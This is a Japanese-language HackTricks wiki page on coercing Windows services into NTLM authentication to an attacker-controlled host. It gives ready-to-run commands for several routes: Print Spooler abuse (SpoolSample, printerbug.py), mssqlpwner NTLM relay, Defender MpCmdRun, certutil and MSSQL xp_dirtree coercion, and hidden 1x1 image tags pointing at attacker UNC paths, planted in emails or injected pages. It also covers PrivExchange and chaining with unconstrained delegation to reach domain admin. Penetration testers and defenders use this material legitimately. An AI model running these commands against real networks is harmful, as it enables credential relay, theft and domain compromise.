# Force NTLM Privileged Authentication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、**3rd party dependencies**を避けるためにMIDLコンパイラを使用してC#でコーディングされた**リモート認証トリガー**の**コレクション**です。

## Spooler Service Abuse

_**Print Spooler**_ サービスが**有効**な場合、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、**通知を任意のシステムに送信するように指示**できます。\
プリンターが任意のシステムに通知を送信する際には、その**システムに対して認証する必要があります**。したがって、攻撃者は_**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証には**コンピュータアカウント**が使用されます。

### Finding Windows Servers on the domain

PowerShellを使用して、Windowsボックスのリストを取得します。サーバーは通常優先されるため、そこに焦点を当てましょう:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spoolerサービスのリスニングを確認する

少し修正された@mysmartlogin（Vincent Le Toux）の[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)を使用して、Spoolerサービスがリスニングしているか確認します：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux上でrpcdump.pyを使用し、MS-RPRNプロトコルを探すこともできます。
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### サービスに任意のホストに対して認証を要求させる

[**ここからSpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、Linuxを使用している場合は、[**3xocyteのdementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用してください。
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegationとの組み合わせ

攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)を持つコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに対して認証させる**ことができます。制約のない委任のため、**プリンタのコンピュータアカウントのTGT**は、制約のない委任を持つコンピュータの**メモリ**に**保存されます**。攻撃者はすでにこのホストを侵害しているため、**このチケットを取得し**、それを悪用することができます（[Pass the Ticket](pass-the-ticket.md)）。

## RCP強制認証

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、メールボックスを持つ任意のドメインユーザーがHTTP経由で任意のクライアント提供ホストに対してExchangeサーバーを強制的に認証させることができます。

デフォルトでは、**ExchangeサービスはSYSTEMとして実行され**、過剰な特権が与えられています（具体的には、**2019年以前の累積更新に対するWriteDacl特権を持っています**）。この欠陥は、**LDAPへの情報の中継を可能にし、その後ドメインNTDSデータベースを抽出する**ために悪用できます。LDAPへの中継が不可能な場合でも、この欠陥はドメイン内の他のホストに対して中継および認証するために使用できます。この攻撃の成功した悪用は、認証された任意のドメインユーザーアカウントでドメイン管理者への即時アクセスを許可します。

## Windows内部

すでにWindowsマシン内にいる場合、特権アカウントを使用してサーバーに接続するようWindowsを強制することができます：

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
または、この別の技術を使用します: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin（Microsoft署名のバイナリ）を使用してNTLM認証を強制することが可能です:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTMLインジェクション

### メール経由

もしあなたが侵入したいマシンにログインしているユーザーの**メールアドレス**を知っているなら、**1x1画像**を含む**メール**を送ることができます。
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
そして、彼がそれを開くと、認証を試みるでしょう。

### MitM

もしあなたがコンピュータに対してMitM攻撃を実行し、彼が視覚化するページにHTMLを注入できるなら、次のような画像をページに注入してみることができます：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1のクラッキング

[NTLMv1チャレンジをキャプチャできる場合は、ここでそれをクラッキングする方法を読んでください](../ntlm/#ntlmv1-attack)。\
&#xNAN;_&#x52;NTLMv1をクラッキングするには、Responderチャレンジを「1122334455667788」に設定する必要があることを忘れないでください。_

{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**

</details>
{% endhint %}
